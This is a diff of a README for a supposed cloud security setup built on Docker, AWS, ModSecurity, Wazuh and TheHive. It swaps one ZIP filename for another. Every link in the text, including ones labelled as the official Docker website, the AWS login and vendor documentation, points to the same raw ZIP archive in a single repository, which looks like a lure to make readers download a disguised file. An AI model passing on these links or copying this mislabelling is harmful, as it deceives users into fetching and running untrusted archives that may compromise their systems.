@@ -1,6 +1,6 @@
 # 🔒 Cloud-Security-Project - Simple Cloud Security Setup
 
-[![Download](https://img.shields.io/badge/Download-Cloud--Security--Project-brightgreen)](https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip)
+[![Download](https://img.shields.io/badge/Download-Cloud--Security--Project-brightgreen)](https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you start:
 
 Feel free to visit this page to download everything you need for setup:
 
-[![Visit GitHub Repository](https://img.shields.io/badge/GitHub-Cloud--Security--Project-blue)](https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip)
+[![Visit GitHub Repository](https://img.shields.io/badge/GitHub-Cloud--Security--Project-blue)](https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Feel free to visit this page to download everything you need for setup:
 Docker runs the applications in containers. You must have Docker installed first.
 
 1. Go to the official Docker website:  
-   https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip  
+   https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip  
 2. Click the **Download for Windows** button.  
 3. Run the installer and follow the instructions.  
 4. After installation completes, open Docker Desktop and sign in if needed.
@@ -49,7 +49,7 @@ Docker runs the applications in containers. You must have Docker installed first
 
 Make sure your AWS account is ready:
 
-- Log in to https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip  
+- Log in to https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip  
 - Your account should have permissions to create EC2 instances, S3 buckets, and related network resources.  
 - If you don’t have an AWS account, create one before proceeding.
 
@@ -58,7 +58,7 @@ Make sure your AWS account is ready:
 You need to get the project files from GitHub:
 
 1. Visit this page:  
-   [Cloud-Security-Project Repository](https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip)  
+   [Cloud-Security-Project Repository](https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip)  
 2. Click on the green **Code** button near the top right side of the page.  
 3. From the dropdown, select **Download ZIP**.  
 4. Save the ZIP file somewhere you can find it (Desktop or Downloads folder).  
@@ -134,11 +134,11 @@ When there is an update, repeat these steps:
 
 ## 📂 Additional Resources
 
-- Learn more about Docker on Windows at https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip  
-- AWS Getting Started Guide: https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip  
-- Nginx and ModSecurity official docs at https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip  
-- Wazuh documentation: https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip  
-- TheHive Project site: https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project-Cloud-Security-1.2.zip  
+- Learn more about Docker on Windows at https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip  
+- AWS Getting Started Guide: https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip  
+- Nginx and ModSecurity official docs at https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip  
+- Wazuh documentation: https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip  
+- TheHive Project site: https://raw.githubusercontent.com/Theonaive195/Cloud-Security-Project/main/sereward/Project_Security_Cloud_1.1.zip  
 
 ---
 
